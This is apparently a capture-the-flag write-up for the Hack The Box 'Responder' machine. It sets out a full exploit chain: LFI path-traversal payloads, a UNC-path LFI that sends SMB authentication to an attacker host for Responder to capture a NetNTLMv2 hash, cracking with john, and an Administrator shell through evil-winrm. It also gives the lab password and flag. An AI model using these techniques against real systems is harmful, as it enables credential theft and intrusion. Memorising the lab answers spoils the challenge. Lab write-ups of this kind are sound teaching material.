# HTB-RESPONDER

<figure><img src="../../.gitbook/assets/image (302).png" alt=""><figcaption></figcaption></figure>

Enumeration<br>

```bash
nmap -p- -T5 --min-rate 1000 -sV 10.129.139.135

```

<figure><img src="../../.gitbook/assets/image (290).png" alt=""><figcaption></figcaption></figure>

Identified open ports and services. Web server detected.

#### 2. Website Enumeration

Navigating to `http://10.129.139.135` redirected to `unika.htb`, confirming **name-based virtual hosting**. Fixed local resolution using `/etc/hosts`:

```bash
echo "10.129.139.135 unika.htb" | sudo tee -a /etc/hosts

```

Website now loads correctly via browser using `http://unika.htb`

<figure><img src="../../.gitbook/assets/image (293).png" alt=""><figcaption></figcaption></figure>

Navigating to http://\[IP] auto-redirected to unika.htb, indicating name-based virtual hosting. Added IP unika.htb in /etc/hosts to resolve the domain locally and trigger the correct Host header response from the server.

<figure><img src="../../.gitbook/assets/image (292).png" alt=""><figcaption></figcaption></figure>

#### 3. LFI Discovery

* Language switch option loads: `?page=french.html`
* Indicates **dynamic file loading** using `page` parameter
* Possibility of **LFI (Local File Inclusion)** if unsanitized

Tested with:

```
?page=../../../../../../windows/system32/drivers/etc/hosts

```

<figure><img src="../../.gitbook/assets/image (294).png" alt=""><figcaption></figcaption></figure>

#### 4. LFI to SMB Trigger for Responder

To exploit the LFI, we use Responder to capture credentials over SMB:

<figure><img src="../../.gitbook/assets/image (295).png" alt=""><figcaption></figcaption></figure>

#### a. Clone and Setup Responder

```bash
git clone <https://github.com/lgandx/Responder>
cd Responder

```

Check tunnel interface (usually `tun0`) via:

```bash
ifconfig

```

Start Responder:

<figure><img src="../../.gitbook/assets/image (296).png" alt=""><figcaption></figcaption></figure>

```bash
sudo python3 Responder.py -I tun0

```

#### 5. Trigger SMB Authentication using LFI

In browser:

```
<http://unika.htb/?page=//><attacker_ip>/xyz

```

<figure><img src="../../.gitbook/assets/image (297).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (298).png" alt=""><figcaption></figcaption></figure>

This causes the vulnerable web server to reach out to our SMB share. Responder captures the **NetNTLMv2 hash**.

<figure><img src="../../.gitbook/assets/image (299).png" alt=""><figcaption></figcaption></figure>

#### 6. Cracking NetNTLMv2 Hash

Save hash from Responder to `hash.txt`. Then crack using **john**:

```bash
john -w=/usr/share/wordlists/rockyou.txt hash.txt

```

<figure><img src="../../.gitbook/assets/image (300).png" alt=""><figcaption></figcaption></figure>

Cracked hash reveals:

```
Username: Administrator
Password: badminton

```

#### 7. Remote Shell via evil-winrm

Target has WinRM port open. Use Evil-WinRM to gain shell:

```bash
evil-winrm -i 10.129.139.135 -u Administrator -p badminton

```

In Evil-WinRM shell:

<figure><img src="../../.gitbook/assets/image (301).png" alt=""><figcaption></figcaption></figure>

```powershell
cls
cd Desktop
cat flag.txt

```

#### 🏁 Final Flag:

```
ea81b7afddd03efaa0945333ed147fac

```

***

**Complete Exploit Chain:** LFI ➜ Responder SMB Trap ➜ NTLMv2 Hash ➜ John ➜ Evil-WinRM Shell
